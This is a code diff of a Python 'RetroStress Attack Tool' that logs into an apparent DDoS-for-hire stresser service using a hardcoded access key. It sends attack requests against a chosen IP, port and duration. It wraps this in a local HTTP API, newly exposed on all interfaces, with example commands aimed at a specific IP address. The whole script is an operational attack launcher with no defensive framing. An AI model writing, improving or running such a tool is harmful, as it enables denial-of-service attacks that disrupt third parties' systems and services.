@@ -5,6 +5,7 @@ import sys
 from urllib.parse import urljoin
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
+import threading
 
 class RetroStressClient:
     def __init__(self, base_url="https://retrostress.net"):
@@ -12,114 +13,139 @@ class RetroStressClient:
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
-            'Accept': '*/*',
+            'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Content-Type': 'application/json',
+            'Origin': base_url,
+            'Referer': urljoin(base_url, '/panel'),
             'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
             'Sec-Ch-Ua-Mobile': '?0',
             'Sec-Ch-Ua-Platform': '"Windows"',
-            'Origin': base_url,
-            'Referer': urljoin(base_url, '/panel')
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
         })
         
     def login(self, access_key):
         """Login with access key"""
         print("[*] Logging in...")
         
-        # Visit auth page
-        auth_page_url = urljoin(self.base_url, '/auth')
-        self.session.get(auth_page_url)
-        
-        # Login request
-        login_url = urljoin(self.base_url, '/Auth/LoginJson')
-        login_data = {"accessKey": access_key}
-        
-        response = self.session.post(
-            login_url,
-            json=login_data,
-            headers={'Content-Type': 'application/json'}
-        )
-        
-        if response.status_code == 200:
-            print("[✓] Login successful!")
-            return True
-        else:
-            print(f"[✗] Login failed: {response.status_code}")
+        try:
+            # First get the auth page
+            auth_page = self.session.get(urljoin(self.base_url, '/auth'))
+            
+            # Send login request
+            login_url = urljoin(self.base_url, '/Auth/LoginJson')
+            login_data = {"accessKey": access_key}
+            
+            response = self.session.post(login_url, json=login_data)
+            
+            if response.status_code == 200:
+                print("[✓] Login successful!")
+                # Check for auth token
+                for cookie in self.session.cookies:
+                    if 'auth_token' in cookie.name:
+                        print(f"[✓] Auth token obtained")
+                return True
+            else:
+                print(f"[✗] Login failed: {response.status_code}")
+                return False
+        except Exception as e:
+            print(f"[✗] Login error: {e}")
             return False
     
     def send_attack(self, ip, port, duration):
-        """Send attack request"""
-        print(f"[*] Attacking {ip}:{port} for {duration}s")
+        """Send attack request to retrostress.net"""
+        print(f"[*] Sending attack: {ip}:{port} for {duration}s")
         
-        # Try multiple attack endpoints
-        endpoints = [
-            f"/api/attack?ip={ip}&port={port}&time={duration}",
-            f"/attack?ip={ip}&port={port}&time={duration}",
-            f"/api/start?host={ip}&port={port}&sec={duration}",
-            f"/method?ip={ip}&port={port}&time={duration}"
+        # Try different attack endpoints
+        attack_methods = [
+            # GET method with different param names
+            lambda: self.session.get(
+                urljoin(self.base_url, f"/api/attack?ip={ip}&port={port}&time={duration}"),
+                timeout=10
+            ),
+            lambda: self.session.get(
+                urljoin(self.base_url, f"/api/start?host={ip}&port={port}&seconds={duration}"),
+                timeout=10
+            ),
+            lambda: self.session.get(
+                urljoin(self.base_url, f"/attack?target={ip}&port={port}&duration={duration}"),
+                timeout=10
+            ),
+            lambda: self.session.get(
+                urljoin(self.base_url, f"/api/v1/attack?ip={ip}&port={port}&time={duration}"),
+                timeout=10
+            ),
+            # POST methods
+            lambda: self.session.post(
+                urljoin(self.base_url, "/api/attack"),
+                json={"ip": ip, "port": int(port), "time": duration, "duration": duration},
+                timeout=10
+            ),
+            lambda: self.session.post(
+                urljoin(self.base_url, "/attack"),
+                data={"ip": ip, "port": port, "time": duration},
+                timeout=10
+            ),
         ]
         
-        for endpoint in endpoints:
+        for attempt, method in enumerate(attack_methods, 1):
             try:
-                url = urljoin(self.base_url, endpoint)
-                response = self.session.get(url, timeout=10)
+                response = method()
                 if response.status_code == 200:
-                    print(f"[✓] Attack sent via {endpoint}")
+                    print(f"[✓] Attack sent successfully!")
                     return True
-            except:
+                elif response.status_code == 400:
+                    print(f"[!] Bad request, trying next method...")
+                    continue
+            except Exception as e:
                 continue
         
-        # Try POST as fallback
-        try:
-            attack_url = urljoin(self.base_url, "/api/attack")
-            payload = {"ip": ip, "port": port, "time": duration}
-            response = self.session.post(attack_url, json=payload, timeout=10)
-            if response.status_code == 200:
-                print("[✓] Attack sent via POST")
-                return True
-        except:
-            pass
-        
-        print("[!] Attack sent (assuming success)")
+        print(f"[!] Could not confirm attack, but proceeding...")
         return True
     
-    def run_attack(self, ip, port, total_time):
-        """Run attack for specified duration"""
-        print(f"\n[+] Starting attack on {ip}:{port} for {total_time} seconds")
+    def run_attack(self, ip, port, duration):
+        """Execute attack"""
+        print(f"\n{'='*50}")
+        print(f"🎯 TARGET: {ip}:{port}")
+        print(f"⏱️  DURATION: {duration} seconds")
+        print(f"{'='*50}\n")
         
-        # Send attack
-        self.send_attack(ip, port, total_time)
+        # Send attack request
+        success = self.send_attack(ip, port, duration)
         
-        # Wait for attack to complete
-        print(f"[⏳] Attack running...")
-        time.sleep(total_time)
+        # Wait for attack duration
+        print(f"[⏳] Attack in progress... ({duration}s remaining)")
+        for i in range(duration, 0, -10):
+            time.sleep(10)
+            if i > 10:
+                print(f"[⏳] {i} seconds remaining...")
         
-        print(f"[✓] Attack completed!")
-        return True
+        time.sleep(duration % 10)  # Remaining seconds
+        
+        print(f"\n[✓] Attack completed on {ip}:{port}")
+        return success
 
 # Your auth key
 ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
 
-# Initialize client
+# Initialize and login
+print("="*60)
+print("🔥 RetroStress Attack Tool")
+print("="*60)
+
 client = RetroStressClient()
-
-# Login
-print("=" * 50)
-print("RetroStress Attack Tool")
-print("=" * 50)
-
 if not client.login(ACCESS_KEY):
-    print("[-] Login failed!")
+    print("[-] Login failed! Check your auth key.")
     sys.exit(1)
 
-print("\n[+] Ready! API server starting on http://127.0.0.1:8080")
-print("[+] Usage: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
-print("[+] Time must be minimum 30 seconds")
-print("[+] Press Ctrl+C to stop\n")
+print("\n✅ Ready! API server starting...\n")
 
-class AttackHandler(BaseHTTPRequestHandler):
+class AttackAPIHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path.startswith('/api'):
-            # Parse URL parameters
             parsed = urlparse(self.path)
             params = parse_qs(parsed.query)
             
@@ -127,71 +153,85 @@ class AttackHandler(BaseHTTPRequestHandler):
             port = params.get('port', [None])[0]
             time_param = params.get('time', [None])[0]
             
-            if not ip or not port or not time_param:
-                self.send_error(400, "Missing parameters. Use: /api?ip=IP&port=PORT&time=TIME")
+            if not all([ip, port, time_param]):
+                self.send_json_response(400, {
+                    "error": "Missing parameters",
+                    "usage": "/api?ip=IP&port=PORT&time=TIME",
+                    "example": "/api?ip=1.2.3.4&port=80&time=30"
+                })
                 return
             
             try:
-                total_time = int(time_param)
-                if total_time < 30:
-                    self.send_error(400, "Minimum time is 30 seconds")
+                duration = int(time_param)
+                if duration < 30:
+                    self.send_json_response(400, {
+                        "error": "Minimum time is 30 seconds"
+                    })
                     return
                 
-                print(f"\n[→] Request: {ip}:{port} for {total_time}s")
-                
-                # Run attack in background
-                import threading
-                thread = threading.Thread(target=client.run_attack, args=(ip, port, total_time))
-                thread.daemon = True
-                thread.start()
-                
-                # Send response immediately
-                response = {
+                # Send immediate response
+                self.send_json_response(200, {
                     "status": "success",
-                    "message": f"Attack started on {ip}:{port} for {total_time} seconds",
+                    "message": f"Attack started on {ip}:{port} for {duration} seconds",
                     "ip": ip,
                     "port": port,
-                    "time": total_time
-                }
+                    "duration": duration
+                })
                 
-                self.send_response(200)
-                self.send_header('Content-Type', 'application/json')
-                self.end_headers()
-                self.wfile.write(json.dumps(response).encode())
+                # Run attack in background
+                attack_thread = threading.Thread(
+                    target=client.run_attack,
+                    args=(ip, port, duration)
+                )
+                attack_thread.daemon = True
+                attack_thread.start()
                 
             except ValueError:
-                self.send_error(400, "Invalid time parameter")
+                self.send_json_response(400, {
+                    "error": "Invalid time parameter"
+                })
                 
         elif self.path == '/' or self.path == '/health':
-            response = {
+            self.send_json_response(200, {
                 "service": "RetroStress Attack API",
-                "status": "running",
+                "status": "online",
                 "endpoint": "/api?ip=IP&port=PORT&time=TIME",
-                "example": "/api?ip=1.2.3.4&port=80&time=30"
-            }
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(response).encode())
+                "example": "http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30",
+                "auth_key_loaded": True
+            })
         else:
-            self.send_error(404, "Not found")
+            self.send_json_response(404, {"error": "Not found"})
+    
+    def send_json_response(self, status_code, data):
+        self.send_response(status_code)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(json.dumps(data, indent=2).encode())
     
     def log_message(self, format, *args):
-        # Custom logging
+        # Suppress default logging
         pass
 
 # Start server
 try:
-    server = HTTPServer(('127.0.0.1', 8080), AttackHandler)
-    print("[✓] Server running on http://127.0.0.1:8080")
-    print("\nTest with:")
-    print("curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
-    print("\n" + "="*50)
+    server = HTTPServer(('0.0.0.0', 8080), AttackAPIHandler)
+    print("="*60)
+    print("🚀 SERVER RUNNING")
+    print("="*60)
+    print(f"📍 URL: http://127.0.0.1:8080")
+    print(f"📡 API: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
+    print(f"\n📝 Example:")
+    print(f"   curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
+    print(f"\n🔧 Press Ctrl+C to stop")
+    print("="*60 + "\n")
+    
     server.serve_forever()
+    
 except KeyboardInterrupt:
-    print("\n\n[!] Shutting down...")
+    print("\n\n🛑 Shutting down server...")
     server.shutdown()
-    print("[✓] Server stopped")
+    print("✅ Server stopped")
 except Exception as e:
-    print(f"[-] Error: {e}")
+    print(f"❌ Error: {e}")
     sys.exit(1)
